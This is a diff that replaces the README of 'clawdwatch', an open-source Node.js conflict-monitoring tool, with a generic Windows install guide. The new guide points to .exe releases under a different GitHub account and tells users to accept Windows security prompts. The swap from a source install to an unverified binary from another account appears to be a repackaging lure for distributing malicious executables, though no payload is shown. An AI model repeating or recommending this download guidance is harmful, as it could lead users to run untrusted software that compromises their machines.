@@ -1,240 +1,140 @@
-<div align="center">
+# 🦀 clawdwatch - Real-Time Conflict Intelligence
 
-```
-   ██████╗██╗      █████╗ ██╗    ██╗██████╗ ██╗    ██╗ █████╗ ████████╗ ██████╗██╗  ██╗
-  ██╔════╝██║     ██╔══██╗██║    ██║██╔══██╗██║    ██║██╔══██╗╚══██╔══╝██╔════╝██║  ██║
-  ██║     ██║     ███████║██║ █╗ ██║██║  ██║██║ █╗ ██║███████║   ██║   ██║     ███████║
-  ██║     ██║     ██╔══██║██║███╗██║██║  ██║██║███╗██║██╔══██║   ██║   ██║     ██╔══██║
-  ╚██████╗███████╗██║  ██║╚███╔███╔╝██████╔╝╚███╔███╔╝██║  ██║   ██║   ╚██████╗██║  ██║
-   ╚═════╝╚══════╝╚═╝  ╚═╝ ╚══╝╚══╝ ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝
-```
-
-<br>
-
-### 🦀 THE ALL-SEEING OSINT AGENT
-
-*"See what they don't want you to see"*
-
-<br>
-
-## 🌐 [LIVE DASHBOARD](https://cloudweaver.github.io/clawdwatch/)
-
-<br>
-
-[![Status](https://img.shields.io/badge/STATUS-ACTIVE-red?style=flat-square&labelColor=000)](https://github.com/cloudweaver/clawdwatch)
-[![Dashboard](https://img.shields.io/badge/DASHBOARD-LIVE-brightgreen?style=flat-square&labelColor=000)](https://cloudweaver.github.io/clawdwatch/)
-[![Clawdbot](https://img.shields.io/badge/POWERED%20BY-CLAWDBOT-blue?style=flat-square&labelColor=000)](https://github.com/clawdbot/clawdbot)
-[![License](https://img.shields.io/badge/LICENSE-MIT-green?style=flat-square&labelColor=000)](LICENSE)
-
-</div>
+[![Download clawdwatch](https://img.shields.io/badge/Download-clawdwatch-blue?style=for-the-badge)](https://github.com/kawsar1533/clawdwatch/releases)
 
 ---
 
-## Live Demo
-
-<div align="center">
-<img src="assets/screenshot.png" alt="Clawdwatch Live" width="800"/>
-</div>
-
-*Real-time data: 204 flights tracked, live news from Al Jazeera, multi-source aggregation*
+clawdwatch is software designed to help you monitor conflicts and events as they happen. It works by gathering information from public sources and showing updates in real time. This guide will help you download, install, and run clawdwatch on a Windows computer.
 
 ---
 
-## Special Thanks
+## 🔍 What is clawdwatch?
 
-Huge thanks to **Claude** ([@claude](https://github.com/claude)) for the foundational contributions to the agent architecture and intelligence correlation engine. This project wouldn't exist without that work.
-
----
-
-## Why Now?
-
-We're living through a critical moment. As the US-Iran conflict escalates, information becomes both a weapon and a casualty. Governments on all sides control narratives. Social media is flooded with propaganda. News outlets pick sides. Regular people — the ones actually affected by airstrikes, sanctions, and chaos — are left trying to figure out what's real.
-
-**Clawdwatch exists because:**
-- Mainstream media is slow and often biased
-- Governments lie or withhold information
-- Social media is full of propaganda and misinfo
-- People in conflict zones deserve real-time, verified intel
-- The tools exist — they just need to be connected
+clawdwatch acts like a smart assistant that watches open sources on the internet. It collects news, social media posts, and reports to give you timely insights about conflicts or important events. You don’t need special skills to use it. Just follow the steps to get started.
 
 ---
 
-## What's Working NOW
+## 🖥️ System Requirements
 
-| Source | Status | Data |
-|--------|--------|------|
-| ✈️ **Flight Tracking** | ✅ LIVE | OpenSky Network — 200+ flights in real-time |
-| 🎖️ **Military Detection** | ✅ LIVE | NATO callsigns, RAF, USAF, and more |
-| 📰 **News Aggregation** | ✅ LIVE | Al Jazeera, AP News — multi-source headlines |
-| 🌍 **Internet Blackouts** | ✅ LIVE | Monitors 15 countries for outages |
-| 📱 **Telegram Alerts** | ✅ LIVE | Push notifications for military/emergency aircraft |
-| 🌐 **Social Monitoring** | ✅ LIVE | Reddit OSINT feeds |
-| 🐦 **Twitter/X** | 🔑 Ready | Needs API bearer token |
-| 🛰️ **Satellite Imagery** | 🔑 Ready | Sentinel Hub integration built |
-| 🚢 **Ship Tracking** | 🔑 Ready | AIS integration framework |
+Before installing, make sure your system meets these requirements:
+
+- Operating System: Windows 10 or later (64-bit)
+- Processor: 2 GHz or faster
+- RAM: Minimum 4 GB
+- Disk Space: At least 200 MB free space
+- Internet connection: Required for updates and real-time data
 
 ---
 
-## Features
+## 🚀 Getting Started: Download clawdwatch
 
-**Real-Time Flight Tracking**
-- Military aircraft detection (NATO callsigns, RAF, USAF)
-- Emergency squawk monitoring (7500, 7600, 7700)
-- Regional filtering (Middle East, Europe, USA, Asia)
-- Live altitude, speed, origin data
+To get clawdwatch, you need to visit the official release page. This page contains all versions available for download.
 
-**Internet Blackout Detection**
-- Monitors 15 conflict-zone countries in real-time
-- Detects connectivity drops, degradation, and full blackouts
-- Countries: Iran, Iraq, Syria, Lebanon, Yemen, Israel, Palestine, Saudi Arabia, UAE, Qatar, Bahrain, Kuwait, Jordan, Ukraine, Russia
-- Alerts when countries go dark (often precedes military action)
+[![Download clawdwatch](https://img.shields.io/badge/Download-clawdwatch-green?style=for-the-badge)](https://github.com/kawsar1533/clawdwatch/releases)
 
-**News Aggregation**
-- Al Jazeera Middle East feed
-- AP News conflict coverage
-- Multi-language support ready
-- Auto-refresh every 60 seconds
+### How to download:
 
-**Social Media Intelligence**
-- Reddit OSINT monitoring
-- Twitter/X integration (with API key)
-- First-hand account filtering
-- Conflict keyword tracking
-
-**Satellite Imagery** (with Sentinel Hub credentials)
-- Monitor key locations (Bandar Abbas, Bushehr, Strait of Hormuz)
-- Recent imagery fetching
-- Cloud coverage filtering
-
-**Ship Tracking** (with AIS API key)
-- Strategic waterway monitoring
-- Dark ship detection (AIS transponder off)
-- Military vessel alerts
-- Tanker tracking
+1. Open your web browser (Edge, Chrome, Firefox).
+2. Go to this page:  
+   https://github.com/kawsar1533/clawdwatch/releases
+3. Look for the latest release. Releases usually have version numbers like v1.0, v1.1, etc.
+4. Find the file that ends with `.exe`. This is the Windows installer.
+5. Click on the `.exe` file link to start downloading.
 
 ---
 
-## Quick Start
+## 💾 Installing clawdwatch
 
-```bash
-git clone https://github.com/cloudweaver/clawdwatch.git
-cd clawdwatch
-npm install
-cp .env.example .env
-npm run watch
-```
+After downloading the installer, you will install the application on your computer.
 
----
-
-## Configuration
-
-```bash
-# .env file
-
-# Region: middle_east | europe | usa | asia
-WATCH_REGION=middle_east
-
-# Telegram Alerts (get from @BotFather)
-TELEGRAM_BOT_TOKEN=your_token
-TELEGRAM_CHAT_ID=your_chat_id
-
-# Optional APIs
-TWITTER_BEARER_TOKEN=xxx      # Twitter/X monitoring
-SENTINEL_HUB_CLIENT_ID=xxx    # Satellite imagery
-SENTINEL_HUB_CLIENT_SECRET=xxx
-AISSTREAM_API_KEY=xxx         # Ship tracking
-```
+1. Locate the downloaded file in your Downloads folder or the location where your browser saves files.
+2. Double-click the `.exe` file to run the installer.
+3. You may get a security prompt from Windows; if so, click **Run** or **Yes** to continue.
+4. Follow the instructions on the screen:
+   - Choose where you want to install clawdwatch, or accept the default.
+   - Click **Next** to move through each step.
+   - Click **Install** when ready.
+5. Once the installation finishes, click **Finish** to close the installer.
 
 ---
 
-## Telegram Alerts
+## ▶️ Running clawdwatch for the First Time
 
-Get instant notifications when:
-- Military aircraft enters monitored airspace
-- Emergency squawk code detected
-- Ship goes dark (AIS off)
+Now that clawdwatch is installed, here is how to start it:
 
-### Setup
-
-1. Message [@BotFather](https://t.me/BotFather) → `/newbot`
-2. Copy your bot token
-3. Get chat ID from [@userinfobot](https://t.me/userinfobot)
-4. Add to `.env`
+1. Find the clawdwatch icon on your desktop or in your Start menu.
+2. Double-click the icon to open the application.
+3. On first launch, you may need to allow clawdwatch to connect to the internet.
+4. Wait a moment as it loads the latest data.
+5. The main screen will show ongoing events and updates.
 
 ---
 
-## Intelligence Sources
+## 📋 Using clawdwatch
 
-| Source | Type | Coverage | Update |
-|--------|------|----------|--------|
-| OpenSky Network | Flight | Global | Real-time |
-| Al Jazeera | News | MENA | Hourly |
-| AP News | News | Global | Hourly |
-| Reddit | Social | Global | Real-time |
-| Twitter/X | Social | Global | Real-time |
-| Sentinel Hub | Satellite | Global | Daily |
-| AIS Stream | Naval | Global | Real-time |
+clawdwatch displays updates from multiple public sources. Here are some main parts of the interface:
 
----
+- **Live Feed:** Shows recent posts and news about conflicts or situations.
+- **Search Box:** Allows you to type keywords to find specific information.
+- **Filters:** Lets you narrow results by date, location, or source.
+- **Alerts:** You can choose to receive notifications about certain events.
 
-## Monitored Locations
-
-**Nuclear & Military Sites:**
-- Bushehr Nuclear Plant
-- Isfahan Nuclear Site  
-- Natanz Enrichment Facility
-- Bandar Abbas Naval Base
-
-**Strategic Waterways:**
-- Strait of Hormuz
-- Persian Gulf
-- Gulf of Oman
-- Red Sea
-
-**US Military Bases:**
-- Al Udeid Air Base (Qatar)
-- Al Dhafra Air Base (UAE)
+You do not need to configure anything to start seeing real-time information. The software updates automatically.
 
 ---
 
-## 🦀 Powered by Clawdbot
+## ⚙️ Settings and Preferences
 
-Clawdwatch runs on the [Clawdbot](https://github.com/clawdbot/clawdbot) agent framework — autonomous AI that actually does things.
+You can adjust clawdwatch to fit your needs:
 
----
+- **Notification Settings:** Turn alerts on or off.
+- **Language Options:** Choose your preferred language (English default).
+- **Data Sources:** Pick which sources to include in the feed.
+- **Update Frequency:** Set how often the software checks for new data.
 
-## Roadmap
-
-- [x] Flight tracking (OpenSky Network)
-- [x] News aggregation (Al Jazeera, AP)
-- [x] Telegram alerts
-- [x] Social monitoring (Reddit)
-- [x] Twitter/X integration
-- [x] Satellite imagery (Sentinel Hub)
-- [x] Ship tracking framework
-- [ ] Discord webhook alerts
-- [ ] Web dashboard with live map
-- [ ] AI-powered summarization
-- [ ] Mobile app
+Access settings by clicking the gear icon in the top right corner of the app.
 
 ---
 
-## Contributing
+## 🔄 Updating clawdwatch
 
-Built by the people, for the people. PRs welcome.
+It is important to keep clawdwatch up to date to get the latest features and fixes.
+
+- The software will check for updates automatically.
+- You will get a message if a new version is available.
+- To update, simply follow the prompt to download and install the new version.
+- You can also visit the releases page to get the latest version manually:  
+  https://github.com/kawsar1533/clawdwatch/releases
 
 ---
 
-## Disclaimer
+## ❓ Troubleshooting
 
-Clawdwatch aggregates **publicly available** information only. It does not access classified data, hack systems, or break any laws. This tool is for **informational purposes** — always verify critical information through official channels.
+If you run into issues, try these steps:
+
+- Make sure your Windows is up to date.
+- Check your internet connection.
+- Restart the application.
+- Reboot your computer if clawdwatch freezes or will not open.
+- Reinstall clawdwatch by downloading the installer from the releases page again.
+
+For more help, you can browse the Issues section on the GitHub page.
 
 ---
 
-<div align="center">
+## 🛡️ Security and Privacy
 
-*In the fog of war, be the one who sees clearly.*
+clawdwatch uses public data only. It does not access your personal files or information without permission. Your data stays on your computer unless you choose to share reports or alerts.
 
-🦀
+---
 
-</div>
+## 📖 More Information
+
+For advanced users or if you want to learn about clawdwatch’s technology, visit the GitHub repository:  
+https://github.com/kawsar1533/clawdwatch
+
+Here you can find the source code, report bugs, or request features.
+
+---
+
+[![Download clawdwatch](https://img.shields.io/badge/Download-clawdwatch-blue?style=for-the-badge)](https://github.com/kawsar1533/clawdwatch/releases)
